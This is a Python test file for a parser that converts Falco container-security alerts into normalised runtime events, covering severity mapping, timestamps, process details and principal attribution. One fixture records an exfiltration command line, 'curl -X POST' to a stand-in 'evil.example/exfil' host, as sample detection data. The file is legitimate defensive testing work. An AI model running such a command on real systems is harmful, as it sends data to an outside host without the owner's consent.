"""Tests for the Falco -> KYA RuntimeEvent parser.

Layer 2 of the runtime-bridge test stack: REAL Falco JSON shapes
taken verbatim from public Falco rule output (the same shape
falcosidekick / fluentbit / Falco's stdout-JSON driver emit). For
each, we verify the parser produces the canonical event we expect
WITHOUT inventing fields the real tool wouldn't emit.

These tests are the live ones for the parser layer: a bug in
priority mapping, time parsing, or principal-hint extraction would
fail here before it reaches a customer running Falco against the
bridge.
"""
from __future__ import annotations

from kya.runtime import RuntimeEvent
from kya.runtime.parsers import falco

# ── Real Falco JSON samples ─────────────────────────────────────

# Falco rule: "Terminal shell in container" -- one of the most
# commonly-fired alerts, taken from Falco's documented JSON output.
# https://falco.org/docs/concepts/outputs/json-output/
REAL_FALCO_SHELL_IN_CONTAINER = {
    "time": "2026-05-29T10:23:45.123456789Z",
    "rule": "Terminal shell in container",
    "priority": "Warning",
    "output": (
        "A shell was spawned in a container with an attached terminal "
        "(user=root container_id=abcd1234 container_name=happy_curie "
        "shell=sh parent=containerd-shim cmdline=sh -i)"
    ),
    "tags": ["container", "mitre_execution", "shell", "T1059"],
    "hostname": "node-01.cluster.internal",
    "source": "syscall",
    "output_fields": {
        "container.id": "abcd1234",
        "container.image.repository": "alpine",
        "container.image.tag": "3.18",
        "container.name": "happy_curie",
        # Matches the RFC3339 ``time`` above
        # (2026-05-29T10:23:45.123456789Z -> 1780050225 s).
        "evt.time": 1780050225123456789,
        "k8s.ns.name": "production",
        "k8s.pod.name": "checkout-7f8b9c-x2k",
        "k8s.sa.name": "checkout-runner",
        "proc.cmdline": "sh -i",
        "proc.exepath": "/bin/sh",
        "proc.name": "sh",
        "proc.pid": 12345,
        "proc.pname": "containerd-shim-runc-v2",
        "proc.ppid": 1234,
        "user.loginuid": 0,
        "user.name": "root",
        "user.uid": 0,
    },
}


# Falco rule: "Write below root" -- file write in / -- different
# tags + no k8s pod (host-level alert).
REAL_FALCO_WRITE_BELOW_ROOT = {
    "time": "2026-05-29T11:00:00.000000000Z",
    "rule": "Write below root",
    "priority": "Error",
    "output": (
        "File below / opened for writing (user=root command=cp foo.sh / "
        "file=/foo.sh program=cp)"
    ),
    "tags": ["filesystem", "mitre_persistence"],
    "hostname": "node-02",
    "source": "syscall",
    "output_fields": {
        "evt.time": 1748516400000000000,
        "fd.name": "/foo.sh",
        "proc.cmdline": "cp foo.sh /",
        "proc.name": "cp",
        "proc.pid": 9999,
        "user.name": "root",
        "user.uid": 0,
    },
}


# Falco alert that carries the principal binding label (the
# integration-recommended label set by the agent's sidecar).
REAL_FALCO_WITH_PRINCIPAL_LABEL = {
    "time": "2026-05-29T12:00:00.000000000Z",
    "rule": "Outbound Connection to C2 Server",
    "priority": "Critical",
    "output": "Outbound connection to known-bad host",
    "tags": ["network", "mitre_command_and_control"],
    "hostname": "node-03",
    "source": "syscall",
    "output_fields": {
        "container.id": "deadbeef",
        "container.image.repository": "myorg/agent-sandbox",
        "container.label.io.veldt.principal_id": "agent_research_42",
        "fd.sip": "203.0.113.42",
        "fd.sport": 443,
        "proc.cmdline": "curl -X POST https://evil.example/exfil",
        "proc.name": "curl",
        "proc.pid": 8888,
        "user.name": "agent",
        "user.uid": 1000,
    },
}


# ── can_parse ───────────────────────────────────────────────────


def test_can_parse_real_falco_alert():
    assert falco.can_parse(REAL_FALCO_SHELL_IN_CONTAINER) is True
    assert falco.can_parse(REAL_FALCO_WRITE_BELOW_ROOT) is True


def test_can_parse_rejects_non_falco_shapes():
    # Tetragon-shaped (has `.process_exec`, no `output_fields`)
    assert falco.can_parse({
        "process_exec": {"process": {"binary": "/bin/sh"}},
        "node_name": "x", "time": "2026-01-01T00:00:00Z",
    }) is False
    # k8s-audit-shaped
    assert falco.can_parse({
        "kind": "Event", "apiVersion": "audit.k8s.io/v1",
        "objectRef": {"resource": "pods"},
    }) is False
    # Empty / wrong types
    assert falco.can_parse({}) is False
    assert falco.can_parse({"rule": 123, "priority": "x"}) is False  # type: ignore[arg-type]
    assert falco.can_parse([]) is False  # type: ignore[arg-type]


# ── parse: core fields ─────────────────────────────────────────


def test_parse_shell_in_container_produces_canonical_event():
    ev = falco.parse(REAL_FALCO_SHELL_IN_CONTAINER)
    assert isinstance(ev, RuntimeEvent)
    assert ev.source_tool == "falco"
    assert ev.source_rule_id == "Terminal shell in container"
    assert ev.severity == "high"  # Warning -> high
    assert ev.action == "terminal_shell_in_container"
    assert ev.container_id == "abcd1234"
    assert ev.container_image == "alpine"
    assert ev.pod_name == "checkout-7f8b9c-x2k"
    assert ev.namespace == "production"
    assert ev.node == "node-01.cluster.internal"
    assert "shell" in ev.tags
    assert "T1059" in ev.tags


def test_parse_severity_mapping_covers_real_falco_priorities():
    """Falco's documented priorities are emergency / alert /
    critical / error / warning / notice / informational / debug.
    The parser must map each to a canonical KYA severity."""
    bases = REAL_FALCO_SHELL_IN_CONTAINER
    mapping = {
        "Emergency": "critical",
        "Alert": "critical",
        "Critical": "critical",
        "Error": "high",
        "Warning": "high",
        "Notice": "medium",
        "Informational": "informational",
        "Debug": "informational",
    }
    for pri, expected in mapping.items():
        ev = falco.parse({**bases, "priority": pri})
        assert ev is not None
        assert ev.severity == expected, pri


def test_parse_time_from_rfc3339_string():
    ev = falco.parse(REAL_FALCO_SHELL_IN_CONTAINER)
    assert ev is not None
    # 2026-05-29T10:23:45.123456789Z -> ~1780050225.12
    assert 1780050225.0 < ev.occurred_at_ts < 1780050225.5


def test_parse_time_falls_back_to_evt_time_when_string_missing():
    bases = dict(REAL_FALCO_SHELL_IN_CONTAINER)
    bases.pop("time")
    ev = falco.parse(bases)
    assert ev is not None
    # evt.time is 1780050225123456789 ns -> 1780050225.123 s
    assert 1780050225.0 < ev.occurred_at_ts < 1780050225.5


def test_parse_time_returns_zero_when_neither_present():
    """Fail-soft: a Falco bug that drops both time fields must not
    crash the bridge -- the event still gets dispatched."""
    bases = dict(REAL_FALCO_SHELL_IN_CONTAINER)
    bases.pop("time")
    of = dict(bases["output_fields"])
    of.pop("evt.time")
    bases["output_fields"] = of
    ev = falco.parse(bases)
    assert ev is not None
    assert ev.occurred_at_ts == 0.0


# ── parse: process ref ─────────────────────────────────────────


def test_process_ref_filled_from_output_fields():
    ev = falco.parse(REAL_FALCO_SHELL_IN_CONTAINER)
    assert ev is not None and ev.process is not None
    assert ev.process.name == "sh"
    assert ev.process.cmdline == "sh -i"
    assert ev.process.pid == 12345
    assert ev.process.ppid == 1234
    assert ev.process.user == "root"
    assert ev.process.uid == 0
    assert ev.process.image == "/bin/sh"


def test_process_ref_none_when_no_proc_fields():
    """Some Falco rules don't bind to a process. The parser should
    return process=None rather than a ProcessRef with all-None
    fields -- saves downstream consumers a defensive check."""
    bases = dict(REAL_FALCO_SHELL_IN_CONTAINER)
    bases["output_fields"] = {"container.id": "x"}
    ev = falco.parse(bases)
    assert ev is not None
    assert ev.process is None


# ── parse: principal hints ─────────────────────────────────────


def test_principal_hints_strongest_first_with_label_present():
    ev = falco.parse(REAL_FALCO_WITH_PRINCIPAL_LABEL)
    assert ev is not None
    kinds = [h.kind for h in ev.principal_hints]
    assert kinds[0] == "container_label"
    assert ev.principal_hints[0].value == "agent_research_42"
    # Process-user hint still emitted as a fallback
    assert "process_user" in kinds


def test_principal_hints_service_account_built_from_ns_plus_name():
    ev = falco.parse(REAL_FALCO_SHELL_IN_CONTAINER)
    assert ev is not None
    sa_hints = [h for h in ev.principal_hints
                if h.kind == "service_account"]
    assert len(sa_hints) == 1
    assert sa_hints[0].value == "production/checkout-runner"


def test_principal_hints_falls_back_to_default_namespace():
    bases = dict(REAL_FALCO_SHELL_IN_CONTAINER)
    of = dict(bases["output_fields"])
    of.pop("k8s.ns.name")
    bases["output_fields"] = of
    ev = falco.parse(bases)
    assert ev is not None
    sa_hints = [h for h in ev.principal_hints
                if h.kind == "service_account"]
    assert sa_hints[0].value == "default/checkout-runner"


def test_principal_hints_host_level_alert_has_only_user_hint():
    """No container labels, no k8s SA -- only the process user
    survives. The bridge's resolver chain will then either bind
    weakly or mark the event unbound (fail-soft, never silent)."""
    ev = falco.parse(REAL_FALCO_WRITE_BELOW_ROOT)
    assert ev is not None
    kinds = [h.kind for h in ev.principal_hints]
    assert kinds == ["process_user"]
    assert ev.principal_hints[0].value == "root"


# ── parse: raw payload detached ───────────────────────────────


def test_raw_payload_detached_from_caller_dict():
    """The parser must copy the raw dict so a downstream mutation of
    the source can't tamper with the evidence we hash."""
    src = dict(REAL_FALCO_SHELL_IN_CONTAINER)
    ev = falco.parse(src)
    assert ev is not None
    src["rule"] = "MUTATED"  # type: ignore[index]
    # ev.raw must still hold the original
    assert ev.raw["rule"] == "Terminal shell in container"
    assert ev.raw is not src


# ── parse: rejection ───────────────────────────────────────────


def test_parse_returns_none_on_wrong_shape():
    assert falco.parse({"not": "falco"}) is None
    assert falco.parse({}) is None
